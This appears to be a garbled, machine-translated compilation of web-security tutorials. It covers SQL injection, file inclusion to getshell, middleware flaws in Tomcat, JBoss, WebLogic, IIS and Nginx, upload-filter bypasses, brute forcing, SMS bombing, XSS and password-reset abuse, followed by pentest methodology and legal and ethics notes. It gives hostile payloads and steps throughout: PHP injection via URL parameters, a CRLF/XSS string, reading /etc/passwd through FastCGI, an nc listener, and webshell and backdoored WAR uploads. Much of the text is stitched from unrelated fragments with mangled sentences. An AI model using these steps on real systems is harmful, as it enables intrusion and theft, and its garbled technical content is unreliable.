In the early business architecture and deployment review, not only pay attention to the security of the business itself, such as whether there are loopholes in business logic and whether the architecture is loopholes.

More importantly, together with operation and maintenance to help the business plan the environment model of online operation, operation and maintenance pay attention to resource consumption, security pays attention to changes in data, files and other things, which is fixed, which is not fixed.

Establish security alarm convergence strategy said above, the idea of establishing host security, will inevitably bring a result, early security alarm is very many, two reasons, one is not considerate, many cases did not consider, so the alarm, two is the business change is bigger, there are a lot of jump out of the security model behavior.

But these will be better improved with fixed business models and frequent security and business communication, coupled with some automation platforms.

Specific implementation strategy to establish basic defense strategy to establish basic capability platform, including host information collection, Agent and Server, etc., in order to collect relevant data, for security model judgment, through open source, security researchers, using a short time, quickly establish the identification and defense of known security risks, this process should not be too long, a person, half a month to a month can be done.

The follow-up focus is on communication with business, operation and maintenance, and formulating a safety model.

Determine the Security Baseline Specification Operation and maintenance security baseline: determine the server security baseline, including port, process, service, directory, user and other specifications.

Finally, in the case of limited security department manpower, through the business, operational security baseline, can not only cooperate with HIDS, the host security risk behavior, can also be based on the security baseline, covering the business operation of safety specifications and fall to the ground, thus, the security department work results are relatively better quantitative.

If you fall into the previous kind of rule-making and attack prevention, how to quantify the work results of the Security Department, and use the number of rules or to resist the number of attacks. You should know that the attack does not happen all the time, and the rules are not all useful.

Since the number of existing data rows of the second keyword reaches two, a syntax error occurs, terminating the execution of the entire statement, so the original function of the current insert/delete/update/select statement is also terminated.

But the conditional statement constructed at payload1 has been executed to get the desired page latency.

So, all the processing of SQL statements occurs inside the server, no need to report false information, no need to worry about the conditional judgment statement will not execute, the final implementation principle is the same as the delay injection of select.

The corresponding character is s, because the first character of the database name is also s, so the condition holds, and the page returns by 5 seconds, so the ASCII code value of the first character is 115, to realize the injection.
Some levels in the target range may be more than one solution, because they are also learning, may not do everything, the article is not perfect, please forgive me.

Install a web environment to have a precondition, and a local web environment first.

phpstduy, is recommended because this software can very quickly and conveniently help us configure the environment, saving the time to configure our own environment.

Download after installed is such a page, here we run MYSQL and NGINX service directly.

After opening the profile, you can see several variables, roughly explain, dbuser and dbpass represent the user name and password of the database respectively, host indicates the native ip address, dbname and dbname1 represent the database name, where we want to change the value of dbuser and dbpass to the correct user name and password of our database, note not to fill in the wrong place, otherwise the target range will go wrong.

The status of the modification is shown below. Remember to save the modification.

After the modification is completed, we can access the target site. We directly click on Setup/reset Database for labs, to connect the target site to the database, as shown in the following figure: If the connection is successful, we should see the following picture: Here, we can start a happy journey to the target site.

What are the possible problems, do you say that your database connection has failed?Don't worry, it is normal to encounter problems in the configuration environment. Below I listed a few problems I encountered in the configuration environment, you can see if it is the same as you encountered, as a reference.

An incorrect username password in the range profile causes a connection failure.

The php version is not compatible: Check out your php version, and if your php version is 7.x, modify it to 5.x.

Because after 7. x of php, mysql_connect() is no longer supported, but mysqli_connect(), but the p h p version of our phpstudy may be 7.x by default.

It is best not to use the 127.0.0.1/sqli-labs when visiting the target site, because with 127.0.0.1, when then doing the post type injection, you may not catch the bag.

The workaround is to open the command line and use the ipconfig command to view my intranet ip and the intranet ip to access it like mine is http://192.168.1.163/sqli-labs/.

File contains profile server executing PHP file you can load PHP code in another file via file containing function and PHP does when it will save developers a lot of time.

This means you can create standard header or menu files for all web pages.

When the header needs to be updated, you can update only one included file, or when you add a new page to the site, just need to modify the menu file.


These two functions differ from the first two in that these two functions contain only once for the case where the same file could be included more than once during script execution you want to make sure it is included only once to avoid function redefinition variable reassignment etc.

The Vulnerability generation cause file containing the parameters that the function loads are not filtered or strictly defined, can be controlled by the user and contains other malicious files, resulting in the execution of unexpected code.

The parameter developer is not rigorously filtered, and is brought directly into the include's function that the attacker can modify to perform unexpected operations.

The information from the phpinfo can obtain the storage location of the session.

The session. is obtained through the information from the phpinfosave_path for / var/lib/php/session:2. attempts by guessing the default session storage location.

If default is stored in / var/lib/php/session directory under linux: content in session can be controlled and malicious passed into code.

vulnerability analysis This php saves the value of the obtained GET type ctfs variable into session.

When accessing the http://www.ctfs-wiki/session.php?After ctfs=ctfs, the value of the session is stored in the / var/lib/php/session directory.

The file name of session is s e s s _ + sessionid,sessionid is available through developer mode.

So the file name for the session is sess_akp79gfiedh13ho11i6f3sm6s6.

Through the analysis above, you can know that the values imported by ctfs are stored in the session file. If the local file contains a vulnerability, you can write the malicious code to the session file through ctfs containing a vulnerability, and then execute this malicious code getshell. through the file contains a vulnerability

When accessing the http://www.ctfs-wiki/session.php?ctfs=<?php phpinfo();?> After that, the value of the session is stored in the / var/lib/php/session directory.

The attacker leaked or guessed through phpinfo() information, the file name can be obtained through developer mode, and then resolves the malicious code getshell. through the vulnerability contained in the file

If the remote file is not strictly filtered resulting causes the code executing malicious files this is the remote file containing vulnerability.

By remote file containing vulnerability, containing php.The txt is parse.
More than an additional html suffix is added to the code, leaving the remotely contained file with an additional html suffix.

What else can you go around the # number?

In addition to these encapsulation protocols, they can also be registered through stream_wrapper_register().

Metencapsuator designed for filter applications when data streams open to read and write local disk files.

That is, you can directly read the unresolved raw data on the POST.

The php://input is not valid when the enctype = "multipart/form-data" is available.

Because the php pseudo-protocol can also use the http protocol, that is, the data can be transmitted using POST.

If the data for the POST is executing the PHP code for writing a one-sentence Trojan, a Trojan is written in the current directory.

Write a one-sentence Trojan file shell.The php and then compressed to shell. with the zip protocolTo zip and then change the suffix to some other format like png.

Originally an optional package for the Windows NT version, later built in with Windows 2000, Windows XP Professional and Windows Server 2003, there was no I I S on the Windows XP Home version.

The IIS is a Web service component that includes a Web server, an FTP server, an NNTP server, and an SMTP server, respectively, for web browsing, file transfer, news services, and mail delivery, making it easy to publish information on the web.

The security vulnerability of IIS has long been criticized by the industry, and the threat of remote execution vulnerability in IIS will be very serious.

The remote execution code vulnerability exists in the HTTP protocol stack when the HTTP.This vulnerability is caused when the sys does not correctly analyze a specially designed HTTP request.

An attacker who has successfully exploited this vulnerability can execute any code in the context of the system account and can cause the machine blue screen where the IIS server is located or to read confidential data in its memory.

IIS Server opens WebDAV, in the W e b Service extension with the permissions to write, causing any file upload.

This vulnerability can only determine the first six characters, and it is difficult to guess if the latter characters are too long and contain special characters.

Guess it if the file name itself is too short.

If the top 6 bits of the file name are filled with space, the short file name in 8.3 format does not match the real file name.

When IIS6.0 handles the PROPFIND instruction, since the length has no effective length control and inspection of the url, memcpy causes the stack overflow, resulting in remote code execution.

The vulnerability environment is built on the windows server 2003 r2 32 bits to install the iis6.0.

Trigger vulnerability in local exp,exp successful success, server-side popup calculator.

When the php encounters the path " / aaa.xxx/bbb.When yyy ", if" / aaa.xxx/bbb.If yyy "does not exist, you will remove the last" bbb.yyy ", then judged that," / aaa.If xxx "exists, or then put" / aaa.Use xxx " as a file.

If there is a file, test.The jpg, accessed later after /.By php, you can put the " test.jpg/.Give php "to php,php repair file path" test.jpg/.The php "get" test.jpg", the file exists and performs it as a php program.

Filtering the new directory file name does not allow the new ones to include '.'File.

The function of building a new directory in the curve website background, and building a new directory is not allowed.

Limit the uploaded script execution permissions and do not allow script execution.

filter.asp/xm.The jpg, was filtered by the ISApi component.

Apache is the world using the number 1 Web server software.

It can run on almost all widely used computer platforms, and is one of the most popular Web server-side software due to its widespread cross-platform and security usage.

It is fast, reliable and expanded with simple API to compile interpreters like Perl/ Python into the server.

The Apache file resolution vulnerability is closely related to the user configuration, which is strictly a user configuration problem.

The Apache file parsing vulnerability involves the feature of a parsing file: Apache default a file can have multiple point-separated suffixes, when the right suffix is not recognized, continue to the left, when we request such a file: shell.xxx.yyyphp-> found that the suffix is php and given to php to handle this file.

The vulnerability reuploads a p h p file with a suffix named 360.

The vulnerability fix will be AddHandler application/x-httpd-php.Profile deletion for php.

It is characterized by little memory and strong concurrency ability, and in fact nginx does perform well in the same type of web server.

For any file name, add / add any file name later.Parsing vulnerability for php such as the original filenname is test.The jpg, you can add test.jpg/x.The php performs a parsing attack.

The HTTP Header is separated by two C R L F's from the HTTP Body, and the browser removes the H T T P content according to the two CRLF's and displays it.

By controlling the characters in the HTTP message header and injecting some malicious change rows you can inject some session cookie or html code and the injection code is executed because Nginx is not configured correctly.

Access the page, grab the packet request plus /%0d%0a%0d%0a <img src=1 onerror=alert (/ xss /)> There is no pop-up because of the page redirection.

A / etc/nginx/conf. profile for NginxThe d/error1.conf is modified to use the undecoded url jump.

The Tomcat Server is a free open source Web application server that belongs to a lightweight application server, is commonly used in small and medium-sized systems and concurrent access users for not many occasions, and is the preferred choice for the development and debugging of JSP programs.

For a beginner, it can be thought that when the Apache server is configured on a machine, it can be used to respond to access requests from the HTML page.

The Tomcat is actually an extension of the Apache server but runtime it s running standalone so when running the tomcat it actually runs separately as a process separate from the Apache.

The Tomcat runs on the Windows host and enables the HTTP PUT request method that can upload JSP files containing arbitrary code to the server via the constructed attack request, causing arbitrary code execution.

The / conf/web. s under the tomcat folderThe xml file insert: Restart the tomcat service.

Visit 127.0.0.1:8080, burp grab the package, send to Repeater, changes the request mode to PUT, create a 122.jsp, and escape the space characters with%20.

The 123.jsp content is: return to 201, indicating the successful creation.

Visit the 127.0.0.1:8080/122.jsp?cmd=calc 。

Tomcat supports deploying war files in the background, and you can deploy webshell directly to the web directory.

If there is a weak password present on the background management page, you can get the password through blasting.

Create a dedicated Tomcat service user that has only a minimum set of permissions.

Increase the deployment of an account locking mechanism for both local and certificate-based authentication.

In the CATALINA_HOME/conf/web.The xml file sets the locking mechanism and the time timeout limit.

And set minimum access limits for directory pages such as manager-gui/manager-status/manager-script.

The jBoss is an application server based on J2EE for developing the source code.
The JBoss code follows the LGPL license and is freely available in any commercial application.

JBoss is a container and server that manages EJB and supports both EJB1.1, EJB 2.0 and EJB3 specifications.

But the JBoss core service does not include W E B containers supporting servlet/JSP and is generally used with Tomcat or Jetty binding.

The process of converting a java object into a byte sequence.

Antisequence is the process of restoring the byte sequence to a java object, but when this turn becomes changed, the programmer's filtering is not strict, which can lead to the implementation of the maliciously constructed code.

The vulnerability recovery target machine starts the jboss.

Attack Machine Access Target Machine Service: Access / invoker/readonly.

No http-invoker. is requiredUsers of the sar component can directly delete this component.

For access control of the httpinvoker components.

Weak password in the jBoss background management page exists, and the account password is obtained through blasting.

Log in to the background to upload the war package containing the backdoor.

Click on Web Application (war) s.

Click on the add a new resource.

Select a war package to upload, after upload, enter that war package and click start.

View the status for the sucessful.

Visit the war package page and enter the back door.

File management and system command execution are available.

WebLogic is a applicationserver, from Oracle that is exactly a JAVAEE architecture-based middleware, a J a v a application server to develop, integrate, deploy, and manage large distributed Web applications, web applications, and database applications.

Introduce Java dynamics and the security of Java Enterprise standards into the development, integration, deployment, and management of large network applications.

Java serialization is, in short, the process of converting java objects into a byte sequence.

Antisequence is the process of restoring the byte sequence to a java object, but when this turn becomes changed, the programmer's filtering is not strict, which can lead to the implementation of the maliciously constructed code.

There is an S S R F vulnerability in Weblogic that allows you to send any HTTP requests and then attack vulnerable components such as redis, fastcgi in the innet.

Grab the package with burp and modify the request.

Start nc listening for port 2222.

The direct way to fix it is to put the SearchPublicRegistries.Remove the jsp directly.

Limit uddiexplorer applications to Intranet access only.

The Weblogic services-side request forgery vulnerability appears in the uddi component, more precisely the uudi package implementation package uddiexplorer.The SearchPublicRegistries. under the warjsp 。


The 2, vulnerability restores access to the http://192.168.139.129:7001/ws_utc/config.do 。

Set the Work Home Dir to ` / u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css`。

Then click on Security-> Add and then upload webshell, here I upload a jsp pony.

After uploading, view the returned packet with a timestamp: you can see that the timestamp is 1543145154632.

Visit the http://192.168.139.129:7001/ws_utc/css/config/keystore/1543145154632_lele.jsp 。

File management, file upload, system command execution, etc.

Try the following to execute the system command.

The command was executed successfully.

Because there is a weak password in the WebLogic background, you can directly enter the background to upload the war package containing the backdoor.

The http://192.168.139.129:7001/console logs in to the background with a weak password.

Click on Lock and Edit.

Select Deployment and click further on the right.

Go to the next step, select the corresponding war package for deployment, and the next step until completion.

Click to Activate the Change.

Start the service generated by the uploaded war package.

Get the webshell.

Vulnerability repair firewall settings port filtering, you can also set only IP lists to the background to avoid weak passwords in the background.

Using the fastcgi protocol and open 9000 ports to the external network, you can construct the fastcgi protocol package content to realize unauthorized access to the server.The php file and the execute arbitrary commands.

The vulnerability was reproduced using the vulhub experimental environment to start the experimental environment.

Use the command python fpm. in the attack machineThe py 192.168.237.136 /etc/passwd, observations return the results.

Due to access to the non- *.PHP file, so returns the result 403.

Use the command to execute a php file that exists by default.

Use command with arbitrary commands.

Call the p h p interpreter for explanation in apache.When php file the pass url parameter to the php interpreter and if passing parameters like command line switch after url cause source code leakage and arbitrary code execution.

This vulnerability affects previous versions of php-5.3.12, mod, fpm, is unaffected.

Using the vulhub experimental environment, the the environment.

Visit the http://192.168.139.129:8080/index.php 。

Focus on apache, turn on the url filter, and filter out the dangerous command-line parameters, because this method is easier to fix, use more.

It is equivalent to one url filtering per request, which may increase the burden of apache if the access is large.

File upload vulnerability is a form of vulnerability often exploited in web security.

Some web applications allow to upload pictures, text or other resources to the specified location, the file upload vulnerability is using these places to upload to implant malicious code into the server, and then access through url to execute the code.

But in some more secure web applications, there tend to be various upload restrictions and filtering causing us being unable to upload specific files.
This article opens a discussion. Learning from this article, you will learn about the processing and verification sending process of file uploads in the Web application and how we can bypass these validation.

Client validationClient validation is a validation that occurs before the input is actually sent to the server.

Most of this validations are done by JavaScript,VBScript or HTML5.

Although, this is better for users to respond faster and experience.

But for malicious attackers, these verification seems to be slightly lower.

It is also very simple for client verification to bypass this type of bypass. We can close the JavaScript on the browser or tamper with the HTTP request from the browser before it is sent to the server.

As you can see this JavaScript only handles your request just before the request is actually sent to the server and check if the file extension you upload is jpg,jpeg,bmp,gif,png.

That way, we can intercept the request and tamper with the file content, and then change the picture extension to the executable extension.

As shown in the figure above, we tried to upload a direct PHP file, and JavaScript blocked our file upload request.

We can bypass the validation with the browser to upload a normal picture format, then intercept the request and change it back to php format and replace the file content with our malicious code so that we are able to successfully upload our malicious php script.

File name verification, as the name suggests, checks the file name extension when the file is uploaded to the service side, and refuses the upload if illegal.

Check if extensions are legal there are two common strategies, blacklist and whitelist policies.

Blacklist policy, where the file extension in the blacklist is illegal.

whitelist policy, where the file extension is not in the whitelist is illegal.

The whitelist strategy is safer than a blacklist.

By restricting the upload type to only the one we accept, we can better guarantee security, because the blacklist we can use various methods to make injection and breakthrough.

Filenames We can bypass this type of validation by uploading some easily overlooked file extensions that we don't usually use much.

Bypasses the Black and White List Strategy: The Blacklist Bypasses the blacklist by uploading unwanted php extensions.
Whitelist passes some type of technique such as adding empty byte injection or using a double extension to upload files.

Also, we can try the extension case to bypass, for example: pHp,Php,phP.

The above code will prevent all file types except the jpg,jpeg,gif,png extension.

In this case we will try to bypass the check and upload a p h p file on the Web server.

Blacklist bypass As you can see change the suffix of the php file to.After php5, the upload validation can be successfully bypassed.

White list bypasses, as shown above, and we used a double extension to bypass the validation.

Content-Type generally refers to the Content-Type, present in a web page used to define the type of network file and the encoding of the web page, determining in what form and what encoding the file receiver will read this file.

Some image file uploads verify the uploaded image by checking whether the content type of the file is the image type.

Content-Type bypassing this type of bypass is also very simple, simply changing the parameter type of "Content-Type" to "image/ *", such as "image/png", "image/jpeg", "image/gif"."

The above code checks the M I M E type in Content-Type header and accepts file uploads of type image/jpeg,image/gif,image/png.

We simply need to change the parameter type of "Content-Type" to its acceptable type to bypass.

Content-Length validation is that the server checks the length of the uploaded file content, and files beyond the limit size will not be allowed to be uploaded.

While this type of validation is not very popular, crosses in files for some applications.

CONTENT-LENGTH bypasses for this type of validation that we can bypass by uploading some very short malicious code.

The size of the uploaded file depends on the maximum length limit on the Web server.

We can use different sizes to fuzzing the upload program and thus calculate its limits.

We can bypass it by uploading a malicious payload file of a size within 30 bytes.

At this time, the time to test whether your basic knowledge is solid.

User name enumeration vulnerability description: generally exists in the system login page, use the loopholes in the login system can test out which user names exist, return different error information can enumerate the user name existing in the system.

In the web system login page, manually use the user name in the system, password at will, try to log in, view its display content.

An attacker can enumerate the login user name existing in the system according to the above prompts returned by the Web application, and then violently crack the password for the enumerated login user name.

It is suggested that the judgment return information of the website login page be modified as consistent: wrong user name or password.

Some manufacturers have default user names and password.

The attacker can use the common weak password disclosed on the Internet to try to log in to the management background, which has a certain impact on the website.

Weak password is prohibited, which should meet a certain complexity.

Find the website login page, try to enter the username, the password is empty to login.

If the login successfully indicates that the authentication login link allows an empty password risk analysis: the attacker can use the vulnerability to log in to the background of the website, operate sensitive data, and even upload the webshell, to control the server.

Determine whether the input password is empty, and prohibit the empty password to login.

Logon authentication bypass vulnerability description: Some login pages can disable js style (uncommon), can easily bypass the login authentication, directly into the system.

Or grab the burp to log around.

If the application is not done well in authentication, it can cause a malicious user or attacker to bypass authentication and access internal resources, such vulnerabilities difficult to prevent through firefirewall and intrusion detection systems.

Use burp to grab the login page, send it to Intruder, and set its password parameters, add payload, to attack, view the length of the byte returned during the attack, to determine the success.

In general, there are three forms of violent crack: a fixed account number to the password violent crack.

On the premise of learning that the account is regular, or through a certain way to obtain a large number of accounts, the fixed password to the account violent crack.

Use the account password database spread on the Internet to hit the database attack.

Attackers generally use automated scripts to combine common usernames and passwords, namely the dictionary, combined with the intruder function of the software burpsuite for violent cracking.

Add verification code, password through encryption algorithm encryption, the number of failures more lock, password strength increase graphic verification code does not fail vulnerability description.

Some websites have graphic verification code in the login box to prevent violent crack attack, but the normal logic is to check the correctness of graphic verification code after entering the verification code, and then if true login operation, for false verification code input error, and use a verification code should be immediately invalid.

However, some website captcha may be controllable, entering some special characters may be able to cheat the server or verification code to use once and did not refresh the test method in time.

After entering the user name, password and verification code, click the login button to block the data packet using burpsuite at the same time, and use the Repeater module or Intruder module to replay the data, and re-send the five observation page changes, whether the verification code input error and other information examples.

If there is a graphic verification code in this login function, the data replay after entering the correct graphic verification code, and found that the graphic verification code failed to repair the scheme in time.

The system pays attention to destroy the verification code in the session after verification and identification during development.

The verification code submitted by the user cannot be empty.

Determine whether the submitted verification code and the consistent message verification code stored on the server bypass the vulnerability description.

Some websites use mobile phone SMS login, text message verification code can be bypassed or too short verification can be blasted.

Request to send a text message, fill in any verification code, and then submit other operation requests, empty or delete the verification code parameters, and test whether you can bypass the detection.

Try a privilege verification code like 000000,111111, etc.

Whether the same SMS verification code can be used many times.

The correct logic should be that after the SMS verification code is obtained, the server should verify the source and effectiveness of the SMS verification code, and should be invalid immediately after using it once.

However, what I encountered is that after using the verification code, users log in again after using the verification code and found that they still login successfully, that is, the SMS verification code was not deleted for risk analysis.

Reset the password, transaction operation and other functions usually require the SMS verification code, if the verification code can be bypassed, the attacker can exploit the vulnerability to reset other people's password or transfer and other dangerous operations.

If a privilege verification code exists, it is recommended to delete it.

The application service side should strictly check whether the verification code parameters are empty and whether the format is correct.
For each request, a new message verification code should be sent, and the old verification code should not be used.

The SMS captcha code can violently crack the vulnerability description.

The number of SMS verification code is too short or too long validity leads to violent crack test methods

Click Send SMS verification code, enter any verification code, submit the request, intercept the request using burpsuite, and set the verification code parameter as the enumeration variable in the intruder module, which is the payload type for the violent crack of the verification code for numbers,.

The SMS verification code here can be violently cracked, because there is not set up SMS verification code error several times, so it can be violently broken risk analysis.

Reset the password, transaction operations and other functions usually require an SMS verification code. If the verification code can be violently cracked, the attacker can use the vulnerability to reset someone else's password or transfer money and other dangerous operations.

The SMS verification code is not less than 6 digits.

Effective for no more than 1 minute.

An account locking policy should be adopted when the number of verification code errors exceeds the upper limit.

A common attack, the attacker through the SMS verification code provided in the website page, through the sending packet acquisition, replay. If the server SMS platform does not do verification, the system will always send SMS messages, thus causing the vulnerability of SMS bombing.

manually find the website registration page, authentication page, whether there is a message sending page, if so, take the next step.

By using the burp or other package truncation tool, grab the packet that sends the verification code, and replay the attack, to check whether the phone has received more than 10 consecutive text messages in a short period of time. If you receive a large number of text messages, there is a vulnerability.

Use burpsuite to conduct data replay risk analysis: attackers fill in others's mobile phone number and submit the intruder function of software burpsuite, so as to achieve the purpose of sending a large number of spam messages to others' mobile phones in a short time.

Reasonable configuration of the background SMS server function, for the same mobile phone number, the sending times should not exceed 3-5 times, and the transmission time interval can be limited.

When the front desk code is written on the page, prohibit the transmission for the same mobile phone number is more than N times, or the verification code function is added to the page, and the sending time interval is limited.

The authentication function should not continue after the account is locked.

The authentication function prevents automation operations, such as adding a graphical verification code.

Password explicit transmission vulnerability description: The transmission is not encrypted during the authentication process.

By grabbing the request of the website login page, the tool is available to burp, wireshark, filder and so on.

Use burpsuite to intercept risk analysis: an attacker sniffs explicit authentication credentials, such as user name password, SESSIONID and other sensitive information, by sniffing network traffic in the LAN network.

It is suggested that according to the secret level requirements of the website, encryption requires encryption, such as using HTTPS, but encryption to increase the cost, which may affect the user experience.

If you do not use HTTPS,, you can use Javascript as password encryption at the front end of the website, encryption before transmission.

The English full name of a cross-station script attack is Cross Site Script, to distinguish it from style sheets, abbreviated as XSS.

It happens because the site outputs the user input into the page, in which process malicious code may be executed by the browser.

Cross-station scripting attack which refers to a malicious attacker inserting malicious h t m l code into a Web page and when the user views the page the html code embedded in the Web is executed for the special purpose of the malicious user.

The test statements of specific cross-station scripts vary depending on the reality, can be self-constructed, as well as trigger events, and only some of the most common construction statements are listed here.

Reflection XSS injection in the user name click login, successfully pop up content risk analysis.

An attacker can use the vulnerability to construct phishing links and trick the victim into accessing and filling in the user name and password, thereby stealing the user's authentication credentials fix.

Verify all the input data to effectively detect the attacks.

All output data are properly encoded to prevent any scripts that were successfully injected from running on the browser side.

Use a standard input validation mechanism to verify the length, type, syntax of all input data, and business rules before any data is accepted as if it can be displayed or stored.

Ensure that user submitted data has been entity coded correctly, it is recommended to encode all characters not limited to a subset.

Specispecify the output: Do not allow an attacker to choose for your user.

Note the limitations of the blacklist validation method: Just find or replace some characters is easily bypassed by XSS-variant attacks.

Before verifying the input, it must be decoded and normalized to meet the current internal representation of the application.

Make sure that the application does not decode the same input twice.

Use a parameterized query to avoid stitching the unfiltered input directly into the SQL query statement.

The permissions used in the Web application to connect to the database are strictly distinguished from the system administrator users of the database, and set the users used in the Web application to connect to the database are not allowed to operate other databases.

Users who set up in the Web application to connect to the database do not allow write permission to the Web directory.

Use the Web to apply a firewall.

Description of sql injection vulnerability: Attack test method to change the meaning of the original statement by combining sql statements: 1. Detection all links through the web vulnerability scanning tool, or manually determine whether there is an injection point. Once the vulnerability is confirmed, you can use the automation tool sqlmap to try injection.

The main reason for SQL injection is that the program does not strictly filter the data input by the user, resulting in illegal data intrusion into the system.

Special characters entered by the user are strictly filtered, such as ', ", <,>, /, *,;, +, -, &, |, (,), and and, or, select, union.

Use a parameterized query to avoid stitching the unfiltered input directly into the SQL query statement.

The permissions used in the Web application to connect to the database are strictly distinguished from the system administrator users of the database, and set the users used in the Web application to connect to the database are not allowed to operate other databases.

Users who set up in the Web application to connect to the database do not allow write permission to the Web directory.

Use the Web to apply a firewall.

The password of any account can be modified by tampering with the user name or ID, violent breaking of the verification code, etc.

The password modification step is generally to check whether the user's original password is correct, and then let the user enter a new password.

Get the link to reset the password by normal means, and guess the composition structure and content of the link.

Construct a link to reset someone's password when you know someone's mailbox.

Reset other people's password by knowing their phone number by exhausthe phone verification code.

The password reset vulnerability I encountered is that I will automatically send a phone message to the phone when forgetting the password, and what I do is intercept it, then modify the phone number, successfully accept the phone message, and then reset the user password.
Another is that after the mobile phone SMS verification, intercept the packet when you reset the password, and modify other people's account password by changing ways such as username, userid.

Password modification function is often implemented step by step, and the attacker bypasses some test steps to modify the user password with an unknown original password.

The reset password process is generally to first verify the registered mailbox or mobile phone number, obtain the link or verification code of the reset password, and then access the reset password link or enter the verification code, and finally enter the new password.

Password reset mechanismSurventing an attack is to directly reset someone else's password by constructing a reset password link or exhaustive mobile phone verification code without an unknown reset password link or mobile phone verification code.

Timely verify the requested user identity and the current logged-in user identity, judge whether you have the right to modify the user's password, and also determine whether the original password is correct.

With the verification of the original password, the number of errors in entering the original password is limited to prevent the attacker from violently breaking the original password.

Key information in the reset password link should be randomized, unpredictable, and prohibit the return of key information to the client.

Browsing vulnerability is due to the configuration defects of the website and directory vulnerability, which will lead to many privacy files and directories on the website, such as database backup files, configuration files, etc., attackers can use the information to access website permission, leading to the website to be hacked.

Use web vulnerability scanner can scan web application for detection or by search, website title containing "index of" keywords website for access.

When an attacker passes access to a directory on the site with no default home file or no default home file set correctly, it will list the entire directory structure, completely exposing the site structure to the attacker.

An attacker may access some secret files by browsing through the directory structure.

The common middleware for this vulnerability are apache and IIS, and the related methods are listed below.

Turn off directory browsing in IIS: In the IIS website properties, check the Directory Browse option and restart the IIS.

Close the directory browsing function in Apache: Open the Apache profile httpd.The conf, find "Options Indexes FollowSymLinks", modified to "Options-Indexes".

Directory browsing is not turned on by default in Nginx, and if you find that it is currently on, you can edit nginx.The conf file, delete the following two lines: autoindex on;autoindex_exact_size on; restart Nginx.

Description of sensitive File Information Disclosure Vulnerability: Sensitive data includes but is not limited to: password, key, certificate, session identity, License, privacy data, authorization data, authorization credentials, personal data, etc., and may contain sensitive data in program files, configuration files, log files, backup files and databases.

Detection forms are varied, and the tool crawler scans the path to the sensitive files, thus finding the sensitive data.

Manual manually to find sensitive information based on the web container or web page source code.

Here I brought you the recent fire sharp information leak, in the source code leaked the user name password information leaked the user name and MD5 encryption password, of course, there are some strange work, will directly pop up to test the user name password, and even the user name password automatic filling and so on I think only these deserve to become an information leak.

The attacker can obtain the website sensitive files, collect the website sensitive information, and thus targeted utilization.

Vulnerability in the development framework, such as the Struts2 framework vulnerability, shiro, etc.

After understanding the structural framework adopted by the website, remove the pseudo-static page, grab the package or read the page source code mode, and find that the website system url is.do and.After the action end type, add the corresponding remote command execution code for judgment.

Using the burp plug-in for passive detection and repair scheme, it is recommended to timely update the struts2 version to the latest SSO certification flaw vulnerability description: SSO certification defects, you can log in to someone else's account.

Information transmission lacks security guarantee SSO certification communication process most use sensitive information in the form of sensitive information, which is easily stolen, resulting in important information leakage.

In addition, most schemes do not sign the key information during the communication process, and are vulnerable to camouflage attack.

Security Defects of Web Services Since single sign-on is basically implemented based on Web services, there are also inevitable security defects of Web services, such as cross-station script attacks, overreach attacks, etc.

Because you only need to log in once, all authorized application systems have access, which may lead to some important information leakage.

It is recommended to use the HTTPS protocol for transmission without affecting the business.

Strictly verify the user identity during the SSO authentication process.

Filter user-incoming parameters to escape or mask special symbols.

What are the differences between penetration tests and hacking?

The penetration test is authorized by the customer.

Use controllable, non-destructive methods and means to discover weaknesses in targets and network devices, namely in attack methods that do not affect the normal operation of the business system.

Help managers know the problems facing their network, while providing security reinforcement advice to help customers improve the security of the system.

Gray box test penetration tests performed with all the knowledge of the customer organization.

White box testing is also known as internal testing This penetration testing technology can simulate malicious activities initiated by authorized individuals, the legitimate connections of organized networks.

White-box testing does not require targeting and intelligence gathering, and can detect and verify the most serious security vulnerabilities in the system at a small cost.

Auditors responsible for the white box test are sometimes known as White Hat.

Model an penetration attack made by an attacker who knows nothing to the customer organization.

Black-box tests are also known as external tests.

With the help of real-world hacking methods, hacker tools, organized step-by-step gradual penetration and intrusion of target systems, reveal some known and unknown security vulnerabilities in the target system, and evaluate whether these vulnerabilities can be exploited by criminals, and cause business and asset losses.

This penetration testing technology checks external access internally through loose services.

It can attack a hypertext transfer protocol, simple mail transfer protocol, structured query language, remote desktop, or other services.

Auditors responsible for the black box test are sometimes known as Black Hat.

Use the white box test and the black box test together.

The penetration test tester can choose the best path of the penetration test based on the limited knowledge and information obtained to the target system. The penetration tester also needs to gradually penetrate into the internal network from the outside. At the same time, the underlying topology of the target network they have will help him better choose attack ways and methods, so as to achieve better penetration test results.

Determine what extent, time limit, can modify the upload, can raise rights, etc.

Please determine whether you can and how much you can do based on your needs and your technical skills.

For example, with a waf, we want to do it by bypassing the waf.

Use the various information listed in the information collection, and use the corresponding vulnerability detection.

Other port service vulnerabilities: 21,8080,22,3389 Communication Security: Clear text transmission verifies all vulnerabilities found in vulnerability detection that may be successfully exploited.

Combined with the actual situation, build a simulated environment for testing.

Then be applied to the target after success.

Combining the results provided by the automated scanning tool.

Validation is against public resources.

Build your own simulation environment for verification.

Sometimes you can try to guess the account number and password of the login port and other information.

If a business vulnerability is found, verify it.

penetration code website, general, default password, etc.

Fully prepared for implementing penetration.

Prepare e x p detected in vulnerability verification for precise strike.

Is there a firewall and other equipment, how to bypass it.

Best tool path, according to weak entry, high Intranet permission location, final goal.

Whether there is a detection mechanism, traffic monitoring, antivirus software, malicious code detection, etc.

Intranet intrusion, sensitive targets.

This step is not required for customer penetration.

Clean up the relevant logs, upload files, etc.

Sorating the code used during permeation such as poc, exp et al.

Organize all the information collected during the infiltration process.

Organize various vulnerabilities and vulnerable location information.

According to the previous first step with the customer determined the scope, needs to organize the data, and form a report.

The causes of the vulnerability, the verification process and the brought harm should be analyzed.

Of course, reasonable, efficient and safe solutions to all the problems that arise.

Not only to find problems but also to solve problems.
Whoever, in violation of State regulations, invades a computer information system in the field of state affairs, national defense construction, or cutting-edge science and technology shall be sentenced to fixed-term imprisonment of not more than three years or criminal detention.

Engaged in activities endangering network security, or provide specialized for engaging in network security activities, tools, or technical support in activities endangering network security, advertising, payment settlement help, does not constitute a crime, illegal income confiscated by the public security organs, detained not more than five days, and can be fined 50000 yuan and 500000 thousand yuan.

If the circumstances are relatively serious, he shall be detained for not less than 5 days but not more than 15 days, and may also be fined not less than 100,000 yuan but not more than one million yuan.

In the process, penetration tester will inevitably be exposed to a large number of customer sensitive information or obtain high network control rights. Therefore, penetration tester must strengthen the channel constraints and consciously eliminate the following behaviors.

Do not privately retain the customer sensitive information of the penetration test, including its initiative and the information obtained in the transmission test.

No backdoor is reserved in the customer network system.

Do not leak the internal customer information to others.

